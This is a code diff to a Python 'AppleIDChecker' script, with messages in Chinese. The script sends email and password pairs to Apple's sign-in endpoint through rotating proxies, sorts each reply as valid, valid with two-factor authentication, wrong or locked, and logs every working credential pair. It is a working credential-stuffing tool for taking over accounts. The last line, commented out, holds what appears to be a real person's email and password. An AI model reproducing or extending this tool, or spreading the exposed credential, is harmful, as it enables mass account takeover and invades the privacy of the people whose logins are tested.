@@ -3,6 +3,8 @@ import requests
 from threading import Lock
 from time import sleep
 import logging
+import json
+
 
 # Configure logging
 logging.basicConfig(level=logging.INFO)
@@ -20,7 +22,8 @@ HEADERS = {
     "Origin": "https://idmsa.apple.com",
     "X-Requested-With": "XMLHttpRequest"
 }
-PASSWORD_CORRECT_MESSAGE = 'authType'
+PASSWORD_CORRECT_MESSAGE_NO_2FA = 'sa'
+PASSWORD_CORRECT_MESSAGE_2FA = 'hsa2'
 PASSWORD_INCORRECT_MESSAGE = 'incorrect'
 CLOSED_ACCOUNT_MESSAGE = 'locked'
 
@@ -52,31 +55,43 @@ class AppleIDChecker:
             'http': f'http://{proxy}',
             'https': f'http://{proxy}'
         }
-
+        print(apple_id, proxies)
         try:
             # with lock:  # Ensure only one thread accesses the proxy at a time
             response = self.session.post(URL, json={"accountName": apple_id, "password": password, "rememberMe": False}, proxies=proxies)
             return self.process_response(apple_id, password, response.text)
         except requests.RequestException as e:
             logger.error(f'HTTP错误: {e}')
-            return {"error": "尝试登录时发生HTTP错误。"}
+            return {"error": "尝试登录时发生HTTP错误，代理IP不可用。"}
 
     def process_response(self, apple_id, password, response_text):
-        if PASSWORD_CORRECT_MESSAGE in response_text:
-            logger.info(f'密码正确 AppleID -> {apple_id}:{password}')
-            result = {"status": "密码正确", "message": "帐号密码正确。"}
-        elif PASSWORD_INCORRECT_MESSAGE in response_text:
-            logger.info(f'密码错误 AppleID -> {apple_id}:{password}')
-            result = {"status": "密码错误", "message": "帐号密码错误。"}
-        elif CLOSED_ACCOUNT_MESSAGE in response_text:
-            logger.info(f'账户已锁定 AppleID -> {apple_id}:{password}')
-            result = {"status": "帐号被锁", "message": "此Apple ID因安全原因已被锁定。"}
-        else:
-            logger.error(f'错误 AppleID -> {apple_id}:{password}')
-            logger.error(f'错误信息 -> {response_text}')
-            result = {"status": "未知错误", "message": "出现未知错误。"}
+        # Attempt to parse the response text as JSON
+        try:
+            response_json = json.loads(response_text)
+        except json.JSONDecodeError:
+            # If response is not JSON, it's an unknown error
+            logger.error(f'Non-JSON response for AppleID -> {apple_id}:{password} | {response_text}')
+            return {"status": "未知错误", "message": "返回内容格式异常，无法解析为JSON。"}
 
-        return result
+        # Check if the response is password correct without 2FA
+        if response_json.get('authType') == "non-sa":
+            logger.info(f'密码正确 NO 2FA AppleID -> {apple_id}:{password}｜{response_text}')
+            return {"status": "密码正确", "message": "帐号密码正确，无需双重认证。"}
+
+        # Check if the response is password correct with 2FA
+        elif response_json.get('authType') in ["sa", "hsa2"]:
+            logger.info(f'双重认证 2FA AppleID -> {apple_id}:{password}｜{response_text}')
+            return {"status": "双重认证", "message": "帐号密码正确，但开启了双重认证。"}
+
+        # Check if the response is password incorrect
+        elif "serviceErrors" in response_json:
+            for error in response_json["serviceErrors"]:
+                if error.get("code") == "-20101":
+                    logger.info(f'密码错误 AppleID -> {apple_id}:{password} | {response_text}')
+                    return {"status": "密码错误", "message": "帐号或密码错误。"}
+
+        # If none of the above, it's an unknown error
+        return {"status": "未知错误", "message": "出现未知错误或其他异常情况。"}
 
 
 # AppleIDChecker().try_login('thepavlova1991@yandex.ru', '250391Vera')
